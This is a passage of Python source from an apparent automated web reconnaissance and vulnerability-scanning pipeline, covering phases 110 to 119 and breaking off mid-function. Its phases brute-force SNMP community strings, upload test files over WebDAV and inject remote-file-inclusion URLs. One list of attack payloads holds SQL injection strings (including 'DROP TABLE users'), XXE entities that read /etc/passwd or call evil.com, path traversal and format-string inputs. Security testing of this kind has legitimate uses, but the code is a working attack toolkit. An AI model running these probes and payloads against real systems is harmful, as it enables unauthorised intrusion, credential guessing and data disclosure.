                                tracker_name = tname
                                break
                        findings.append(f"[third-party-js] {host_clean} src={src} tracker={tracker_name}")
                        has_sri = bool(re.search(r'\bintegrity\s*=', stag, re.I))
                        if not has_sri:
                            findings.append(f"[third-party-nosri] {host_clean} src={src}")
                break
            except Exception:
                continue
    if not findings:
        findings.append("[thirdpartyjs] No third-party JS issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"110-THIRDPARTYJS: {len(findings)} findings → {out}")
    return {"110-THIRDPARTYJS": str(out), "count": len(findings)}


async def phase_111_BROWSERSTORAGE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"111-BROWSERSTORAGE"}:
        return {}
    _out = outdir / "browser_storage_audit.txt"
    if _out.exists() and not force:
        return {"111-BROWSERSTORAGE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 111-BROWSERSTORAGE: Browser storage audit")
    findings: List[str] = []
    _bs_urlopen = _get_urlopener()
    _bs_extra_headers = _extra_headers_dict()
    js_urls_file = outdir / "urls_js.txt"
    js_urls = read_lines(js_urls_file) if js_urls_file.exists() else []
    if not js_urls:
        log("warn", "111-BROWSERSTORAGE: no JS URLs; skipping")
        return {"111-BROWSERSTORAGE": str(_out), "count": 0}
    sensitive_patterns = ["token", "password", "secret", "api_key", "apikey", "session",
                          "jwt", "access_token", "refresh_token", "auth", "credential",
                          "private", "key", "passwd", "pwd", "secretkey"]
    sample = getattr(_PIPELINE_CFG, 'sample_hosts_browserstorage', 15)
    for js_url in js_urls[:sample]:
        js_url = js_url.strip()
        if not js_url:
            continue
        try:
            await _throttle_rate()
            req = urllib.request.Request(js_url, headers={"User-Agent": "Mozilla/5.0", **_bs_extra_headers})
            s, _, body_bytes = await _async_urlopen(_bs_urlopen, req, timeout=10)
            if s != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            storage_calls = re.findall(r'(localStorage|sessionStorage)\.(?:setItem|getItem|removeItem)\s*\(\s*["\']([^"\']+)["\']', body, re.I)
            for storage_type, key in storage_calls:
                key_lower = key.lower()
                for sp in sensitive_patterns:
                    if sp in key_lower:
                        findings.append(f"[browser-storage-sensitive] {js_url} pattern={sp}")
                        break
                findings.append(f"[browser-storage] {js_url} storage_type={storage_type} key={key}")
            indexeddb_matches = re.findall(r'indexedDB\.open\s*\(\s*["\']([^"\']+)["\']', body, re.I)
            for db_name in indexeddb_matches:
                db_lower = db_name.lower()
                for sp in sensitive_patterns:
                    if sp in db_lower:
                        findings.append(f"[browser-storage-sensitive] {js_url} pattern={sp}")
                        break
                findings.append(f"[browser-storage] {js_url} storage_type=IndexedDB key={db_name}")
        except Exception:
            continue
    if not findings:
        findings.append("[browserstorage] No browser storage issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"111-BROWSERSTORAGE: {len(findings)} findings → {out}")
    return {"111-BROWSERSTORAGE": str(out), "count": len(findings)}


async def phase_112_RFI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"112-RFI"}:
        return {}
    _out = outdir / "rfi_findings.txt"
    if _out.exists() and not force:
        return {"112-RFI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 112-RFI: Remote file inclusion")
    oast_domain = prev.get("oast_domain", "") if isinstance(prev, dict) else ""
    findings: List[str] = []
    _rfi_urlopen = _get_urlopener()
    _rfi_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "112-RFI: no URLs; skipping")
        return {"112-RFI": str(_out), "count": 0}
    rfi_params = {"file", "include", "template", "page", "load", "path", "doc", "pg",
                  "folder", "root", "inc", "loc", "site", "show", "view", "content",
                  "document", "import", "require", "read", "dir", "url", "uri"}
    sample = getattr(_PIPELINE_CFG, 'sample_urls_rfi', 20)
    rfi_candidates = [u for u in all_urls if "=" in u and any(p + "=" in u.lower() for p in rfi_params)][:sample]
    if not rfi_candidates:
        log("warn", "112-RFI: no candidate URLs with RFI parameters; skipping")
        return {"112-RFI": str(_out), "count": 0}
    for url in rfi_candidates:
        await _throttle_rate()
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            modified = False
            for pname, pvals in list(params.items()):
                if pname.lower() in rfi_params:
                    for payload in [
                        f"http://{oast_domain}/rfi-test.txt" if oast_domain else "https://example.com/test.txt",
                        "https://example.com/test.txt",
                        f"http://{oast_domain}/rfi-test.php" if oast_domain else "http://test.rfi-check.com/test",
                    ]:
                        params[pname] = [payload]
                        new_qs = urllib.parse.urlencode(params, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        try:
                            req = urllib.request.Request(test_url,
                                headers={"User-Agent": "Mozilla/5.0", **_rfi_extra_headers})
                            status, _, resp_body = await _async_urlopen(_rfi_urlopen, req, timeout=10)
                            body_lower = resp_body.decode("utf-8", errors="ignore").lower()
                            hints = []
                            if "example.com" in body_lower or "test.txt" in body_lower:
                                hints.append("content_reflected")
                            if status in (200, 302) and "include" in body_lower:
                                hints.append("include_possible")
                            if hints or status not in (404, 403):
                                hint_str = ",".join(hints) if hints else f"http_{status}"
                                findings.append(
                                    f"[rfi-candidate] {url.split('?')[0]} param={pname} "
                                    f"payload={payload[:80]} response_hint={hint_str}"
                                )
                                modified = True
                                break
                        except Exception:
                            continue
                    if modified:
                        break
        except Exception:
            continue
    if not findings:
        findings.append("[rfi] No RFI candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"112-RFI: {len(findings)} findings → {out}")
    return {"112-RFI": str(out), "count": len(findings)}


async def phase_113_WEBDAV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"113-WEBDAV"}:
        return {}
    _out = outdir / "webdav_enumeration.txt"
    if _out.exists() and not force:
        return {"113-WEBDAV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 113-WEBDAV: WebDAV enumeration")
    findings: List[str] = []
    _wd_urlopen = _get_urlopener()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "113-WEBDAV: no hosts; skipping")
        return {"113-WEBDAV": str(_out), "count": 0}
    webdav_methods = {"PUT", "DELETE", "MKCOL", "COPY", "MOVE", "PROPFIND", "LOCK", "UNLOCK"}
    sample = getattr(_PIPELINE_CFG, 'sample_hosts_webdav', 10)
    for host in hosts[:sample]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host_clean}"
            try:
                req = urllib.request.Request(base, method="OPTIONS",
                    headers={"User-Agent": "Mozilla/5.0"})
                req_opener = _get_no_redirect_urlopener()
                s, headers, _ = await _async_urlopen_no_redirect(req_opener, req, timeout=10)
                if s not in (200, 401, 403):
                    continue
                allow = headers.get("allow", headers.get("Allow", ""))
                dav_header = headers.get("dav", headers.get("DAV", ""))
                allowed_methods = {m.strip().upper() for m in allow.split(",") if m.strip()}
                enabled = allowed_methods & webdav_methods
                if enabled or dav_header:
                    methods_str = ", ".join(sorted(enabled)) if enabled else dav_header
                    findings.append(f"[webdav-enabled] {host_clean} methods={methods_str}")
                    webdav_xml = '<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>'
                    try:
                        prop_req = urllib.request.Request(base, data=webdav_xml.encode(), method="PROPFIND",
                            headers={
                                "User-Agent": "Mozilla/5.0",
                                "Content-Type": "application/xml",
                                "Depth": "1",
                            })
                        ps, _, pb = await _async_urlopen_no_redirect(req_opener, prop_req, timeout=10)
                        if ps in (200, 207, 301, 302):
                            body = pb.decode("utf-8", errors="ignore")
                            paths = re.findall(r'<D:href>([^<]+)</D:href>', body, re.I)
                            if not paths:
                                paths = re.findall(r'<href>([^<]+)</href>', body, re.I)
                            for p in paths[:20]:
                                findings.append(f"[webdav-enum] {host_clean} path={p[:200]}")
                    except Exception:
                        pass
                    if "PUT" in enabled:
                        test_content = b"webdav-test-file-" + str(time.time()).encode()
                        test_path = "/.reconchain_webdav_test.txt"
                        try:
                            put_req = urllib.request.Request(
                                base + test_path, data=test_content, method="PUT",
                                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "text/plain"},
                            )
                            ps, _, _ = await _async_urlopen_no_redirect(req_opener, put_req, timeout=10)
                            if ps in (200, 201, 204):
                                findings.append(f"[webdav-writable] {host_clean} path={test_path}")
                                del_req = urllib.request.Request(
                                    base + test_path, method="DELETE",
                                    headers={"User-Agent": "Mozilla/5.0"},
                                )
                                try:
                                    await _async_urlopen_no_redirect(req_opener, del_req, timeout=10)
                                except Exception:
                                    pass
                        except Exception:
                            pass
                break
            except Exception:
                continue
    if not findings:
        findings.append("[webdav] No WebDAV services found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"113-WEBDAV: {len(findings)} findings → {out}")
    return {"113-WEBDAV": str(out), "count": len(findings)}


async def phase_114_SNMP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"114-SNMP"}:
        return {}
    _out = outdir / "snmp_findings.txt"
    if _out.exists() and not force:
        return {"114-SNMP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 114-SNMP: SNMP community string brute-force")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "114-SNMP: no hosts; skipping")
        return {"114-SNMP": str(_out), "count": 0}
    community_strings = ["public", "private", "manager", "admin", "snmp", "monitor",
                         "read", "write", "test", "secret", "c0de", "all", "default"]
    sample = getattr(_PIPELINE_CFG, 'sample_hosts_snmp', 10)
    for host in hosts[:sample]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        try:
            resolved = socket.gethostbyname(host_clean)
        except socket.gaierror:
            continue
        has_nmap = False
        # Clear proxy env vars for nmap — raw/stealth packets can't route through SOCKS
        _nmap_saved = {v: os.environ.pop(v, None) for v in _PROXY_CLEAR_VARS}
        try:
            result = subprocess.run(
                ["nmap", "--version"],
                capture_output=True, text=True, timeout=5,
            )
            has_nmap = result.returncode == 0
        except Exception:
            has_nmap = False
        if has_nmap:
            for community in community_strings:
                try:
                    result = subprocess.run(
                        ["nmap", "-sU", "-p", "161", "--script", "snmp-brute",
                         "--script-args", f"snmp-brute.communitiesdb={community}",
                         "-Pn", "--host-timeout", "30s", resolved],
                        capture_output=True, text=True, timeout=60,
                    )
                    output = result.stdout + result.stderr
                    if community in output.lower() and ("open" in output.lower() or "valid" in output.lower() or "discovered" in output.lower()):
                        findings.append(f"[snmp-community] {host_clean} community={community}")
                        enum_result = subprocess.run(
                            ["nmap", "-sU", "-p", "161", "--script", "snmp-info",
                             "-Pn", "--host-timeout", "30s", resolved],
                            capture_output=True, text=True, timeout=60,
                        )
                        enum_output = enum_result.stdout + enum_result.stderr
                        lines = [l.strip() for l in enum_output.splitlines() if l.strip()]
                        info = "; ".join(lines[:10])[:300]
                        if info:
                            findings.append(f"[snmp-enum] {host_clean} info={info}")
                        break
                except subprocess.TimeoutExpired:
                    continue
                except Exception:
                    continue
        else:
            for community in community_strings:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(3)
                    comm_bytes = community.encode()
                    inner_content = (
                        b"\x02\x01\x01"  # version = 1
                        + b"\x04" + bytes([len(comm_bytes)]) + comm_bytes  # community
                        + b"\xa0\x1c" + (  # GetRequest PDU
                            b"\x02\x04\x00\x00\x00\x01"  # request-id
                            b"\x02\x01\x00"  # error = 0
                            b"\x02\x01\x00"  # error-index = 0
                            b"\x30\x0e\x30\x0c"  # varbind list
                            b"\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00"  # sysDescr OID
                            b"\x05\x00"  # NULL
                        )
                    )
                    inner_len = len(inner_content)
                    snmp_req = b"\x30" + bytes([inner_len]) + inner_content
                    sock.sendto(snmp_req, (resolved, 161))
                    data, _ = sock.recvfrom(4096)
                    if data and len(data) > 20:
                        try:
                            text = data.decode("utf-8", errors="ignore")
                        except Exception:
                            text = str(data[:100])
                        findings.append(f"[snmp-community] {host_clean} community={community}")
                        findings.append(f"[snmp-enum] {host_clean} info={text[:200]}")
                        break
                except socket.timeout:
                    continue
                except Exception:
                    continue
                finally:
                    if sock is not None:
                        try:
                            sock.close()
                        except Exception:
                            pass
        # Restore proxy env vars
        for v, val in _nmap_saved.items():
            if val is not None:
                os.environ[v] = val
            else:
                os.environ.pop(v, None)
    if not findings:
        findings.append("[snmp] No SNMP community strings discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"114-SNMP: {len(findings)} findings → {out}")
    return {"114-SNMP": str(out), "count": len(findings)}
# ────────────────── Phase 115-BANNER: SSH/FTP Banner Grabbing ─────────────────


async def _grab_banner(host: str, port: int, timeout_s: float = 5) -> str:
    """Connect to host:port and read up to 1024 bytes of banner."""
    try:
        loop = asyncio.get_event_loop()
        sock = await asyncio.wait_for(
            loop.run_in_executor(None, lambda: socket.create_connection((host, port), timeout=timeout_s)),
            timeout=timeout_s + 1,
        )
        banner_bytes = await asyncio.wait_for(
            loop.run_in_executor(None, lambda: sock.recv(1024)),
            timeout=timeout_s,
        )
        sock.close()
        return banner_bytes.decode("utf-8", errors="replace").strip()
    except Exception:
        return ""


def _extract_service_version(banner: str) -> str:
    """Extract service type and version from a banner string."""
    banner_lower = banner.lower()
    if "openssh" in banner_lower or "ssh" in banner_lower:
        m = re.search(r'OpenSSH[_-]?([\d.]+)', banner, re.I)
        ver = m.group(1) if m else "unknown"
        return f"OpenSSH_{ver}"
    if "vsftpd" in banner_lower:
        m = re.search(r'vsftpd[_-]?([\d.]+)', banner, re.I)
        ver = m.group(1) if m else "unknown"
        return f"vsftpd_{ver}"
    if "proftpd" in banner_lower:
        m = re.search(r'ProFTPD[_-]?([\d.]+)', banner, re.I)
        ver = m.group(1) if m else "unknown"
        return f"ProFTPD_{ver}"
    if "pure-ftpd" in banner_lower:
        m = re.search(r'Pure-FTPd[_-]?([\d.]+)', banner, re.I)
        ver = m.group(1) if m else "unknown"
        return f"Pure-FTPd_{ver}"
    if "filezilla" in banner_lower:
        m = re.search(r'FileZilla[_-]?([\d.]+)', banner, re.I)
        ver = m.group(1) if m else "unknown"
        return f"FileZilla_{ver}"
    if "ftp" in banner_lower:
        m = re.search(r'([\w]+[\d.]+)', banner)
        ver = m.group(1) if m else "unknown"
        return f"FTP_{ver}"
    if "telnet" in banner_lower:
        m = re.search(r'Telnet[_-]?([\d.]+)', banner, re.I)
        ver = m.group(1) if m else "unknown"
        return f"Telnet_{ver}"
    if "rdp" in banner_lower or "terminal" in banner_lower or "remote desktop" in banner_lower:
        return "MS-RDP_unknown"
    # fallback: try to extract any version-like substring
    m = re.search(r'[\w+\s]+[\d.]+', banner[:60])
    svc = m.group(0).strip() if m else banner[:40].strip()
    return svc.replace(" ", "_")


async def phase_115_BANNER(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"115-BANNER"}:
        return {}
    _out = outdir / "banners.txt"
    if _out.exists() and not force:
        return {"115-BANNER": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 115-BANNER: SSH/FTP banner grabbing")

    # Collect hosts from ports.txt or hosts.txt
    hosts_ports: Dict[str, set] = {}  # host -> set of ports
    ports_file = outdir / "ports.txt"
    hosts_file = outdir / "hosts.txt"
    if ports_file.exists():
        for ln in read_lines(ports_file):
            ln = ln.strip()
            if not ln:
                continue
            if ":" in ln:
                h, p = ln.rsplit(":", 1)
                try:
                    port = int(p)
                    hosts_ports.setdefault(h.strip(), set()).add(port)
                except ValueError:
                    hosts_ports.setdefault(ln.strip(), set())
            else:
                hosts_ports.setdefault(ln.strip(), set())
    if not hosts_ports and hosts_file.exists():
        for h in read_lines(hosts_file):
            h = h.strip()
            if h:
                hosts_ports.setdefault(h, set())

    if not hosts_ports:
        log("warn", "115-BANNER: no hosts found; skipping")
        return {"115-BANNER": str(_out), "count": 0}

    service_ports = [22, 21, 23, 3389]
    sample_size = min(len(hosts_ports), _PIPELINE_CFG.sample_hosts_banner)
    sampled_hosts = list(hosts_ports.items())[:sample_size]

    findings: List[str] = []
    banner_results = await asyncio.gather(*[
        _grab_banner(host, port)
        for host, ports in sampled_hosts
        for port in (ports & set(service_ports) or service_ports)
    ])
    idx = 0
    for host, ports in sampled_hosts:
        probe_ports = ports & set(service_ports) or service_ports
        for port in probe_ports:
            banner = banner_results[idx]
            idx += 1
            if banner:
                svc_name = {22: "SSH", 21: "FTP", 23: "Telnet", 3389: "RDP"}.get(port, str(port))
                version = _extract_service_version(banner)
                findings.append(
                    f"[banner] {host}:{port} service={svc_name} version={version} banner={banner[:120]}"
                )

    if not findings:
        findings.append("[banner] No banners retrieved (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"115-BANNER: {len(findings)} banners → {out}")
    return {"115-BANNER": str(out), "count": len(findings)}


# ────────────────── Phase 116-PHPINFO: phpinfo() Disclosure ─────────────────


_PHPINFO_PATHS = [
    "/phpinfo.php", "/info.php", "/test.php", "/i.php",
    "/php.php", "/pi.php", "/status.php", "/debug.php",
]
_PHPINFO_INDICATORS = ["PHP Version", "php.ini", "System", "Loaded Configuration", "PHP Credits"]


async def phase_116_PHPINFO(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"116-PHPINFO"}:
        return {}
    _out = outdir / "phpinfo_disclosure.txt"
    if _out.exists() and not force:
        return {"116-PHPINFO": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 116-PHPINFO: phpinfo() disclosure detection")
    hosts_file = outdir / "hosts.txt"
    all_hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not all_hosts:
        log("warn", "116-PHPINFO: no hosts; skipping")
        return {"116-PHPINFO": str(_out), "count": 0}
    _urlopen = _get_urlopener()
    _extra_headers = _extra_headers_dict()
    findings: List[str] = []
    targets = [f"https://{h}" if not h.startswith("http") else h for h in all_hosts][:_PIPELINE_CFG.sample_hosts_phpinfo]

    async def _probe_phpinfo(base: str) -> List[str]:
        results: List[str] = []
        for path in _PHPINFO_PATHS:
            url = base.rstrip("/") + path
            await _throttle_rate()
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_headers})
                status, headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status != 200:
                    continue
                body = body_bytes.decode("utf-8", errors="ignore")
                if any(ind in body for ind in _PHPINFO_INDICATORS):
                    php_ver = "unknown"
                    m = re.search(r'<tr><td class="e">PHP Version </td><td class="v">([^<]+)</td></tr>', body)
                    if m:
                        php_ver = m.group(1)
                    modules: List[str] = re.findall(
                        r'<tr><td class="e">([^<]+)</td><td class="v">(?:enabled|disabled)', body
                    )
                    mod_str = ",".join(sorted(set(modules)))[:200]
                    disabled = re.findall(
                        r'<tr><td class="e">([^<]+)</td><td class="v"><i>disabled</i>', body
                    )
                    env_vars = ""
                    env_section = re.search(
                        r'<tr><td class="e">(?:PHP|User/HTTP) (?:Environment|Variables).*?<tbody>(.*?)</tbody>',
                        body, re.DOTALL,
                    )
                    if env_section:
                        env_vars = env_section.group(1)[:100]
                    detail_parts = [f"php_version={php_ver}"]
                    if mod_str:
                        detail_parts.append(f"modules={mod_str}")
                    if disabled:
                        detail_parts.append(f"disabled_functions={','.join(disabled)[:100]}")
                    if env_vars:
                        detail_parts.append(f"env={env_vars.strip()}")
                    detail = " ".join(detail_parts)
                    results.append(f"[phpinfo] {base} path={path} {detail}")
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_phpinfo(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[phpinfo] No phpinfo() disclosures found (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"116-PHPINFO: {len(findings)} findings → {out}")
    return {"116-PHPINFO": str(out), "count": len(findings)}


# ────────────────── Phase 117-SRVSTATUS: Server Status Exposure ─────────────


_SERVER_STATUS_PATHS = [
    "/server-status", "/server-info",
    "/nginx_status", "/fStatus",
]
_SERVER_STATUS_INDICATORS: Dict[str, List[str]] = {
    "Apache": [
        "Server Version:", "Server Built:", "Current Time:", "Restart Time:",
        "Parent Server Generation:", "Total Accesses:", "Total kBytes:",
    ],
    "Nginx": [
        "Active connections:", "server accepts handled requests",
        "Reading:", "Writing:", "Waiting:",
    ],
    "lighttpd": [
        "lighttpd", "fStatus", "uptime",
    ],
}


async def phase_117_SRVSTATUS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"117-SRVSTATUS"}:
        return {}
    _out = outdir / "server_status_exposed.txt"
    if _out.exists() and not force:
        return {"117-SRVSTATUS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 117-SRVSTATUS: server status page exposure detection")
    hosts_file = outdir / "hosts.txt"
    all_hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not all_hosts:
        log("warn", "117-SRVSTATUS: no hosts; skipping")
        return {"117-SRVSTATUS": str(_out), "count": 0}
    _urlopen = _get_urlopener()
    _extra_headers = _extra_headers_dict()
    findings: List[str] = []
    targets = [f"https://{h}" if not h.startswith("http") else h for h in all_hosts][:_PIPELINE_CFG.sample_hosts_srvstatus]

    async def _probe_status(base: str) -> List[str]:
        results: List[str] = []
        for path in _SERVER_STATUS_PATHS:
            url = base.rstrip("/") + path
            await _throttle_rate()
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_headers})
                status, headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status != 200:
                    continue
                body = body_bytes.decode("utf-8", errors="ignore")
                for server_type, indicators in _SERVER_STATUS_INDICATORS.items():
                    if any(ind in body for ind in indicators):
                        snippet = body[:300].replace("\n", " ").strip()
                        results.append(
                            f"[status-exposed] {base} path={path} server_type={server_type} leaked_data={snippet[:200]}"
                        )
                        break
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_status(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[status-exposed] No server status pages exposed (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"117-SRVSTATUS: {len(findings)} findings → {out}")
    return {"117-SRVSTATUS": str(out), "count": len(findings)}


# ────────────────── Phase 118-ERRORLEAK: Error Page Information Leakage ─────


_ERRORLEAK_PAYLOADS = [
    ("sqli", "'"),
    ("sqli", "1' OR '1'='1"),
    ("sqli", "1' OR '1'='1' --"),
    ("sqli", "1' UNION SELECT NULL--"),
    ("sqli", "1' UNION SELECT NULL,NULL,NULL--"),
    ("sqli", '1" OR "1"="1'),
    ("sqli", "1; DROP TABLE users--"),
    ("xml", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
    ("xml", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/">]>'),
    ("path", "../../../../etc/passwd"),
    ("path", "....//....//....//etc/passwd"),
    ("null", "%00"),
    ("null", "test%00.php"),
    ("long", "A" * 5000),
    ("long", "B" * 10000),
    ("special", "..\\..\\..\\windows\\win.ini"),
    ("special", "../../../etc/passwd%00"),
    ("special", "index.php%00"),
    ("unicode", "\u0000\u0001\u0002\u0003"),
    ("format", "%s%s%s%s%s%s%s%s%s%s"),
    ("format", "%n%n%n%n%n%n%n%n%n%n"),
    ("overflow", "-1"),
    ("overflow", "2147483648"),
    ("overflow", "9" * 100),
]

_ERRORLEAK_INDICATORS = [
    # Stack traces
    ("stacktrace", re.compile(r'Stack trace:|at\s+\S+\.\w+\(|Traceback \(most recent call last\)|#\d+\s+\S+\.\w+')),
    ("sql-leak", re.compile(r'SQL syntax.*MySQL|Warning.*mysql_|PostgreSQL.*ERROR|SQLSTATE|Driver.*SQL|Unclosed quotation mark|Incorrect syntax near')),
    ("db-version", re.compile(r'MySQL server version|PostgreSQL [\d.]+|SQLite version|Oracle [\d.]+|MariaDB [\d.]+')),
    ("filepath", re.compile(r'(/var/www/[^\s<>"\'\)]+|/home/[^\s<>"\'\)]+|C:\\[^\s<>"\'\)]+|/usr/local/[^\s<>"\'\)]+)')),
    ("framework", re.compile(r'(Symfony|Laravel|Django|Rails|Spring|Express|Koa|Flask|CodeIgniter|CakePHP|Zend|Phalcon|Yii|ASP\.NET)')),
    ("php-error", re.compile(r'(Fatal error|Parse error|Notice|Warning|Deprecated):\s+\S+ in /')),
    ("java-error", re.compile(r'(Exception|Error) in thread|java\.lang\.\w+Exception|javax\.')),
    ("full-path", re.compile(r'<b>Warning</b>.*<b>/.*</b>')),
    ("xml-error", re.compile(r'(XML parsing error|XML declaration allowed only at the start|parser error : )')),
    ("debug-info", re.compile(r'(DEBUG|TRACE|LOG|DUMP|VAR_DUMP|print_r)\s*[:\(]', re.I)),
]

async def phase_118_ERRORLEAK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"118-ERRORLEAK"}:
        return {}
    _out = outdir / "error_leakage.txt"
    if _out.exists() and not force:
        return {"118-ERRORLEAK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 118-ERRORLEAK: error page information leakage detection")
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "118-ERRORLEAK: no URLs; skipping")
        return {"118-ERRORLEAK": str(_out), "count": 0}
    _urlopen = _get_urlopener()
    _extra_headers = _extra_headers_dict()
    findings: List[str] = []
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_errorleak]
    if not param_urls:
        log("warn", "118-ERRORLEAK: no parameter-bearing URLs; skipping")
        return {"118-ERRORLEAK": str(_out), "count": 0}

    async def _probe_leak(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for ptype, payload in _ERRORLEAK_PAYLOADS[:_PIPELINE_CFG.sample_endpoints_post]:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_headers})
                    status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    for leak_type, pattern in _ERRORLEAK_INDICATORS:
                        m = pattern.search(body)
                        if m:
                            detail = m.group(0)[:200].replace("\n", " ").strip()
                            results.append(
                                f"[error-leak] {url} param={pname} type={leak_type} detail={detail}"
                            )
                            break
                except urllib.error.HTTPError as e:
                    try:
                        err_body = e.read().decode("utf-8", errors="ignore")
                        for leak_type, pattern in _ERRORLEAK_INDICATORS:
                            m = pattern.search(err_body)
                            if m:
                                detail = m.group(0)[:200].replace("\n", " ").strip()
                                results.append(
                                    f"[error-leak] {url} param={pname} type={leak_type} detail={detail}"
                                )
                                break
                    except Exception:
                        pass
                except Exception:
                    continue
        return results

    probe_results = await asyncio.gather(*[_probe_leak(u) for u in param_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[error-leak] No error information leakage detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"118-ERRORLEAK: {len(findings)} findings → {out}")
    return {"118-ERRORLEAK": str(out), "count": len(findings)}


# ────────────────── Phase 119-WILDCARDDNS: Wildcard DNS Detection ────────────


def _resolve_host(hostname: str) -> List[str]:
    """Resolve a hostname to IP addresses using getaddrinfo."""
    try:
        infos = socket.getaddrinfo(hostname, None)
        return list(set(info[4][0] for info in infos))
    except socket.gaierror:
        return []
    except Exception:
        return []


def _generate_random_subdomains(domain: str, count: int) -> List[str]:
    """Generate random non-existent subdomains for wildcard testing."""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    subs: List[str] = []
    for _ in range(count):
        prefix = "".join(random.choice(chars) for _ in range(random.randint(6, 12)))
        subs.append(f"{prefix}.{domain}")
    return subs


async def phase_119_WILDCARDDNS(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"119-WILDCARDDNS"}:
        return {}
    _out = outdir / "wildcard_dns.txt"
    if _out.exists() and not force:
        return {"119-WILDCARDDNS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 119-WILDCARDDNS: wildcard DNS detection")
    findings: List[str] = []
    count = max(5, min(10, _PIPELINE_CFG.sample_hosts_wildcarddns))
    random_subs = _generate_random_subdomains(domain, count)
    loop = asyncio.get_event_loop()
